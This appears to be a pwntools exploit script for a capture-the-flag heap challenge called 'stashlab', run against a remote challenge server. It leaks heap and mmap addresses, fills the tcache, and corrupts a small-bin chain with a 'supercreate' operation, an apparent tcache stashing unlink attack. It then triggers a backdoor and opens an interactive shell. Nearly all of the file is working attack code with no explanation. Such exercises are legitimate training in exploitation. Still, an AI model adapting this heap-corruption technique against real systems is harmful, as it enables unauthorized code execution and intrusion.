from pwn import *

# p = process('./stashlab')
p = remote('140.112.31.97', 30107)

def create(size, uuid, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('UUID : ', str(uuid))
    p.sendafter('Content : ', content)

def edit(index, UUID):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))
    p.sendafter('UUID : ', str(UUID))

def delete(index):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))

def supercreate(size, uuid, content):
    p.sendafter('>', '4')
    p.sendafter('size : ', str(size))
    p.sendafter('UUID : ', str(uuid))
    p.sendafter('Content : ', content)

def backdoor():
    p.sendafter('>', '5')

p.recvuntil('0x')
mmap = int(p.recvline().strip(), 16)-0x18
p.recvuntil('0x')
heap = int(p.recvline().strip(), 16) - 0x2a0
success('target = 0x%x', mmap)
success('heap = 0x%x', heap)

for i in range(8):
    create(0x78, 1, 'a')
for i in range(1, 8):
    delete(i)   # fill tcache
delete(0)   # make index 0 on unsorted bin

supercreate(0x78, 0, p64(heap+0x2b0)+p64(mmap+0x8))  # get one chunk from tcache
create(0x88, 0, 'a') # make unsorted bin to small bin
edit(0, heap+0x6b0)
create(0x78, 0, 'a')
backdoor()

p.interactive()